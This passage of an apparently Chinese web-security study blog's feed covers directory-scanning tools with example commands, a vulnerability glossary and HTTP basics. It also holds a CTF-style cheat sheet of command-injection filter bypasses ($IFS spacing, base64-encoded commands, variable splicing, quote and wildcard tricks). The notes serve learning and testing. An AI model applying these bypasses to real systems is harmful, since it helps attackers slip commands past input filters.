title="网站爬虫"></a>网站爬虫</h4><p>通过awvs，burpsuite的爬行功能，可以拓扑出网站的目录结构，有的时候运气好能在网页的目录结构中找到好东西，不过爬行一般会结合工具扫描，比如你构造域名+目录，然后扫描这个。</p><p>burp spider爬行</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5957324/e8ea6ea2a48a6af41fb053131a979ec7.png?imageView2/2/w/660"></p><p>img</p><h4 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h4><h5 id="御剑后台扫描工具"><a href="#御剑后台扫描工具" class="headerlink" title="御剑后台扫描工具"></a>御剑后台扫描工具</h5><p>御剑是一款针对网站目录及后台管理地址进行扫描的工具。该工具的开发思路其实是非常简单的，而工具里目录或者后台管理地址等的扫描用例才是一个黑客多年经验的结晶。</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5957324/a2fbf4e766bdbba6e3f04c432256918d.png?imageView2/2/w/660"></p><p>img</p><h5 id="DirBuster"><a href="#DirBuster" class="headerlink" title="DirBuster"></a>DirBuster</h5><p>DirBuster是OWASP（Open Web Application Security Project）开发的一款专门用于探测Web服务器目录及隐藏文件的，功能十分强大的工具。DirBuster最擅长目录的暴力猜解，因此，DirBuster一般都会发现一些目录浏览、目录遍历及目录穿越等漏洞，甚至还会发现一些后台管理地址等。</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5957324/b293c79e4ce6cc7ba0ab7d4bceff8102.png?imageView2/2/w/660"></p><p>3b2fca51126d0f343b1cb86a1085d9a9.png</p><h5 id="wwwscan"><a href="#wwwscan" class="headerlink" title="wwwscan"></a>wwwscan</h5><p>wwwscan是一款网站后台扫描工具，简单好用又强大。它有命令行和图形界面两种。</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5957324/24ce89ac6d03de0bb3224cb4c9b67c4e.png?imageView2/2/w/660"></p><p>e22f74eaee18b731c5453b0e79f8e294.png</p><h5 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h5><p>Kali Linux内置工具</p><p>dirb是一个基于字典的web目录扫描工具,会用递归的方式来获取更多的目录,它还支持代理和http认证限制访问的网站。</p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">dirb <span class="hljs-attr">http</span>:<span class="hljs-comment">//www.baidu.com</span><br></code></pre></td></tr></table></figure><h5 id="dirmap"><a href="#dirmap" class="headerlink" title="dirmap"></a>dirmap</h5><p>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑</p><p>项目地址：<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">python3 dirmap.<span class="hljs-property">py</span> -i <span class="hljs-attr">https</span>:<span class="hljs-comment">//target.com -lcf</span><br></code></pre></td></tr></table></figure><h5 id="Cansina"><a href="#Cansina" class="headerlink" title="Cansina"></a>Cansina</h5><p>Cansina是用python写的一款探测网站的敏感目录和内容的<a href="https://cloud.tencent.com/product/sr?from_column=20065&from=20065">安全测试</a>工具</p><p>项目地址：<a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a></p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">python3 cansina.<span class="hljs-property">py</span> -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//baidu.com</span><br></code></pre></td></tr></table></figure><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><p>dirsearch是一个python开发的目录扫描工具,目的是扫描网站的敏感文件和目录从而找到突破口。</p><p>项目地址：<a href="https://github.com/maurosoria/dirsearch/">https://github.com/maurosoria/dirsearch/</a></p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">python3 dirsearch.<span class="hljs-property">py</span> -u <span class="hljs-attr">http</span>:<span class="hljs-comment">//www.baidu.com -e php,js --exclude-status 403,401</span><br></code></pre></td></tr></table></figure><h5 id="weakfilescan"><a href="#weakfilescan" class="headerlink" title="weakfilescan"></a>weakfilescan</h5><p>基于爬虫，动态收集扫描目标相关信息后进行二次整理形成字典规则，利用动态规则的多线程敏感信息泄露<a href="https://cloud.tencent.com/product/tools?from_column=20065&from=20065">检测工具</a>。</p><p>项目地址：<a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p><p>运行示例：</p><p>代码语言：javascript</p><p>复制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">python wyspider.<span class="hljs-property">py</span> <span class="hljs-attr">http</span>:<span class="hljs-comment">//wuyun.org php</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试之敏感文件目录探测总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过</title>
    <link href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><blockquote><p>​<code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS</code>​等可以代替</p><p>​<code>$IFS</code>​在linux下表示分隔符，但是如果单纯的<code>cat$IFS2</code>​，bash解释器会把整个<code>IFS2</code>​当做变量名，所以导致输不出来结果，因此这里加一个<code>&#123;&#125;</code>​就固定了变量名。<br> 同理，在后面加个<code>$</code>​可以起到截断的作用，使用<code>$9</code>​是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p></blockquote><h2 id="截断符号代替"><a href="#截断符号代替" class="headerlink" title="截断符号代替"></a>截断符号代替</h2><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">$ ; | - ( ) ` || &amp;&amp; &amp; &#125; &#123; %<span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure></blockquote><h2 id="cat命令代替"><a href="#cat命令代替" class="headerlink" title="cat命令代替"></a>cat命令代替</h2><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-number">1</span>)more:一页一页的显示档案内容<br>(<span class="hljs-number">2</span>)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>(<span class="hljs-number">3</span>)head:查看头几行<br>(<span class="hljs-number">4</span>)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>(<span class="hljs-number">5</span>)tail:查看尾几行<br>(<span class="hljs-number">6</span>)nl：显示的时候，顺便输出行号<br>(<span class="hljs-number">7</span>)od:以二进制的方式读取档案内容<br>(<span class="hljs-number">8</span>)vi:一种编辑器，这个也可以查看<br>(<span class="hljs-number">9</span>)vim:一种编辑器，这个也可以查看<br>(<span class="hljs-number">10</span>)sort:可以查看<br>(<span class="hljs-number">11</span>)uniq:可以查看<br>(<span class="hljs-number">12</span>)file -f:报错出具体内容<br></code></pre></td></tr></table></figure></blockquote><h2 id="反斜杠过滤ca-t-fl-ag-txt​"><a href="#反斜杠过滤ca-t-fl-ag-txt​" class="headerlink" title="反斜杠过滤ca\t fl\ag.txt​"></a>反斜杠过滤<code>ca\t fl\ag.txt</code>​</h2><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a><strong>编码绕过</strong></h2><blockquote><p>​<code>echo &#39;Y2F0Cg==&#39; | base64 -d</code>​  flag.txt</p><p>假如过滤了flag字符，那么就把flag也base编码，假如禁用了bash</p></blockquote><h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a><strong>拼接绕过</strong></h2><blockquote><p>a&#x3D;c;b&#x3D;at;c&#x3D;f;d&#x3D;lag;e&#x3D;.txt;$a$b ${c}${d}${e}<br>cat flag.txt</p></blockquote><h2 id="单双引号绕过​-c-a-t-test-c-a-t-test-​"><a href="#单双引号绕过​-c-a-t-test-c-a-t-test-​" class="headerlink" title="单双引号绕过​**c&#39;a&#39;t  test c&quot;a&quot;t  test**​"></a><strong>单双引号绕过</strong>​**<kbd>c&#39;a&#39;t  test c&quot;a&quot;t  test</kbd>**​</h2><h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a><strong>通配符绕过</strong></h2><blockquote><p>[…]表示匹配方括号之中的任意一个字符<br> {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。<br> {…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开</p><p>​<kbd>cat  t?st &amp; cat  te* &amp; cat  t[a-z]st &amp; cat  t{a,b,c,d,e,f}st</kbd>​</p></blockquote><h2 id="内敛执行绕过"><a href="#内敛执行绕过" class="headerlink" title="内敛执行绕过"></a>内敛执行绕过</h2><blockquote><p>`命令`和$(命令)都是执行命令的方式</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞名词</title>
    <link href="/2025/05/20/Web/%E6%BC%8F%E6%B4%9E%E5%90%8D%E8%AF%8D/"/>
    <url>/2025/05/20/Web/%E6%BC%8F%E6%B4%9E%E5%90%8D%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞名词"><a href="#漏洞名词" class="headerlink" title="漏洞名词"></a>漏洞名词</h1><ul><li>POC（Proof of Concept）</li></ul><p>漏洞证明，漏洞报告中，通过一段描述或一个样例来证明漏洞确实存在</p><ul><li>EXP（Exploit）</li></ul><p><a href="https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8&spm=1001.2101.3001.7020">漏洞利用</a>，某个漏洞存在EXP，意思就是该漏洞存在公开的利用方式（比如一个脚本）</p><ul><li>0DAY</li></ul><p>含义是刚刚被发现，还没有被公开的漏洞，也没有相应的补丁程序，威胁极大。</p><ul><li>CVE（Common Vulnerabilities &amp; Exposures）</li></ul><p>公共漏洞和暴露，<a href="https://so.csdn.net/so/search?q=CVE&spm=1001.2101.3001.7020">CVE</a>就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。使用一个共同的名字，可以帮助用户在各自独立的各种漏洞数据库中和漏洞评估工具中共享数据 。如果在一个漏洞报告中指明的一个漏洞，如果有CVE名称，你就可以快速地在任何其它CVE兼容的数据库中找到相应修补的信息，解决安全问题 。</p><ul><li>CAN</li></ul><p>CAN和CVE的唯一区别是前者代表了候选条目，还未经CVE编辑委员会认可，而后者则是经过认可的条目。 然后，两种类型的条目都对公众可见，条目的编号不会随着认可而改变—仅仅是“CAN”前缀替换成了“CVE”。</p><ul><li>BUGTRAQ</li></ul><p>一个完整的对计算机安全漏洞（它们是什么，如何利用它们，以及如何修补它们）的公告及详细论述进行适度披露的邮件列表</p><ul><li>CNCVE</li></ul><p>中国（CN）的 CVE ，是CNCERT&#x2F;CC（国家计算机网络应急处理协调中心）为漏洞进行编号的一个自己的标准。CNCVE不但包含漏洞的描述予以统一定义，还将包括漏洞的补丁、验证等措施，更方便、有用。</p><ul><li>CNVD</li></ul><p>国家信息安全漏洞共享平台。是由国家计算机网络应急技术处理协调中心（简称CNCERT）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库。</p><ul><li>CNNVD</li></ul><p>中国国家信息安全漏洞库。是中国信息安全测评中心为切实履行漏洞分析和风险评估的职能，负责建设运维的国家信息安全漏洞库，为我国信息安全保障提供基础服务</p><p>官网：<a href="https://www.cnnvd.org.cn/home/childHome" title="国家信息安全漏洞库">国家信息安全漏洞库</a></p><p>CVSS(Common Vulnerability Scoring System)<br>通用漏洞评分系统，行业公开标准，用来评测漏洞的严重程度，0-10分值越高越严重,美国国家漏洞数据库官网：<a href="https://nvd.nist.gov/vuln/search%E5%8F%AF%E6%9F%A5%E8%AF%A2CVE%E5%AF%B9%E5%BA%94CVSS%E5%88%86%E5%80%BC">https://nvd.nist.gov/vuln/search可查询CVE对应CVSS分值</a></p><p><em>PS：评分会受时间和空间影响，如随着时间推移，漏洞相关补丁越多，可被利用性越低；漏洞存在不同的环境，也会影响漏洞的威胁程度</em></p><ul><li>VUL（Vulnerability）</li></ul><p>漏洞</p><ul><li>CPE（Common Platform Enumeration）</li></ul><p>以标准化方式为软件应用程序、操作系统及硬件命名的方法</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞名词</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP信息结构</title>
    <link href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%84/"/>
    <url>/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP信息结构"><a href="#HTTP信息结构" class="headerlink" title="HTTP信息结构"></a>HTTP信息结构</h1><p>HTTP 是基于<strong>客户端&#x2F;服务端（C&#x2F;S）</strong> 的架构模型，通过一个可靠的链接来交换信息，是一个<strong>无状态的请求&#x2F;响应协议</strong>。</p><p>HTTP 消息是客户端和服务器之间通信的基础，它们由一系列的文本行组成，遵循特定的格式和结构。</p><p>HTTP消息分为两种类型：请求消息和响应消息。</p><p>一个 HTTP 客户端是一个应用程序（Web 浏览器或其他任何客户端），通过连接到服务器达到向服务器发送一个或多个 HTTP 的请求的目的。</p><p>一个 HTTP 服务器 同样也是一个应用程序（通常是一个 Web 服务，如 Nginx、Apache 服务器或 IIS 服务器等），通过接收客户端的请求并向客户端发送 HTTP 响应数据。</p><p><img src="/.com//image-20250520030550-1c25gs4.png" alt="image"></p><hr><h2 id="客户端请求消息"><a href="#客户端请求消息" class="headerlink" title="客户端请求消息"></a>客户端请求消息</h2><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：<strong>请求行（request line）</strong> 、<strong>请求头部（header）</strong> 、空行和<strong>请求数据</strong>四个部分组成，下图给出了请求报文的一般格式。</p><p><img src="/.com//image-20250520030559-jci9yiy.png" alt="image"></p><ul><li><p><strong>请求行</strong>（Request Line）：</p><ul><li><strong>方法</strong>：如 <strong>GET、POST、PUT、DELETE</strong>等，指定要执行的操作。</li><li><strong>请求 URI</strong>（统一资源标识符）：请求的资源路径，通常包括主机名、端口号（如果非默认）、路径和查询字符串。</li><li><strong>HTTP 版本</strong>：如 HTTP&#x2F;1.1 或 HTTP&#x2F;2。</li></ul><p>请求行的格式示例：<code>GET /index.html HTTP/1.1</code>​</p></li><li><p><strong>请求头</strong>（Request Headers）：</p><ul><li>包含了客户端环境信息、请求体的大小（如果有）、客户端支持的压缩类型等。</li><li>常见的请求头包括<code>Host</code>​、<code>User-Agent</code>​、<code>Accept</code>​、<code>Accept-Encoding</code>​、<code>Content-Length</code>​等。</li></ul></li><li><p><strong>空行</strong>：</p><ul><li>请求头和请求体之间的<strong>分隔符</strong>，表示请求头的结束。</li></ul></li><li><p><strong>请求体</strong>（可选）：</p><ul><li>在某些类型的HTTP请求（如 <strong>POST 和 PUT</strong>）中，请求体包含要发送给服务器的数据。</li></ul></li></ul><hr><h2 id="服务器响应消息"><a href="#服务器响应消息" class="headerlink" title="服务器响应消息"></a>服务器响应消息</h2><p>HTTP 响应也由四个部分组成，分别是：<strong>状态行、消息报头、空行和响应正文</strong>。</p><p><img src="/.com//image-20250520030619-j7zy37b.png" alt="image"></p><ul><li><p><strong>状态行</strong>（Status Line）：</p><ul><li><strong>HTTP 版本</strong>：与请求消息中的版本相匹配。</li><li><strong>状态码</strong>：三位数，表示请求的处理结果，如 200 表示成功，404 表示未找到资源。</li><li><strong>状态信息</strong>：状态码的简短描述。</li></ul><p>状态行的格式示例：<code>HTTP/1.1 200 OK</code>​</p></li><li><p><strong>响应头</strong>（Response Headers）：</p><ul><li>包含了服务器环境信息、响应体的大小、服务器支持的压缩类型等。</li><li>常见的响应头包括<code>Content-Type</code>​、<code>Content-Length</code>​、<code>Server</code>​、<code>Set-Cookie</code>​等。</li></ul></li><li><p><strong>空行</strong>：</p><ul><li>响应头和响应体之间的分隔符，表示响应头的结束。</li></ul></li><li><p><strong>响应体</strong>（可选）：</p><ul><li>包含服务器返回的数据，如请求的网页内容、图片、JSON数据等。</li></ul></li></ul><hr><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>下面实例是一点典型的使用 GET 来传递数据的实例：</p><p>客户端请求：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /index.html HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: www.example.com<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Connection</span>: keep-alive<br></code></pre></td></tr></table></figure><p>服务端响应:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Wed, 18 Apr 2024 12:00:00 GMT<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>Apache/2.4.1 (Unix)<br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Wed, 18 Apr 2024 11:00:00 GMT<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>12345<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Example Page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, World!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-comment">&lt;!-- The rest of the HTML content --&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>在实际应用中，HTTP 消息可以包含更多的头字段，并且请求体和响应体的大小会根据传输的数据而变化。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>HTTP教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP信息结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP 状态码</title>
    <link href="/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <url>/2025/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20%E7%8A%B6%E6%80%81%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。</p><p>下面是常见的 HTTP 状态码：</p><ul><li><p><strong>1xx（信息性状态码）</strong> ：表示接收的请求正在处理。</p></li><li><p><strong>2xx（成功状态码）</strong> ：表示请求正常处理完毕。</p></li><li><p><strong>3xx（重定向状态码）</strong> ：需要后续操作才能完成这一请求。</p></li><li><p><strong>4xx（客户端错误状态码）</strong> ：表示请求包含语法错误或无法完成。</p></li><li><p><strong>5xx（服务器错误状态码）</strong> ：服务器在处理请求的过程中发生了错误。</p></li><li><p>200 OK：请求成功</p></li><li><p>204 No Content：请求成功，但响应报文不含实体的主体部分</p></li><li><p>301 Moved Permanently：永久性重定向</p></li><li><p>302 Found：临时性重定向</p></li><li><p>304 Not Modified：未修改</p></li><li><p>400 Bad Request：请求报文存在语法错误</p></li><li><p>401 Unauthorized：需要认证</p></li><li><p>403 Forbidden：请求被服务器拒绝</p></li><li><p>404 Not Found：无法找到指定位置的资源</p></li><li><p>500 Internal Server Error：服务器内部错误</p></li><li><p>503 Service Unavailable：服务器暂时处于超负载或正在停机维护</p></li></ul><hr><h2 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h2><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p><table><thead><tr><th>分类</th><th>分类描述</th></tr></thead><tbody><tr><td>1**</td><td>信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td>2**</td><td>成功，操作被成功接收并处理</td></tr><tr><td>3**</td><td>重定向，需要进一步的操作以完成请求</td></tr><tr><td>4**</td><td>客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td>5**</td><td>服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p>HTTP状态码列表:</p><table><thead><tr><th>状态码</th><th>状态码英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed（预期失败）</td><td>服务器无法满足请求头中 Expect 字段指定的预期行为。</td></tr><tr><td>418</td><td>I’m a teapot</td><td>状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>HTTP教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTTP 状态码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
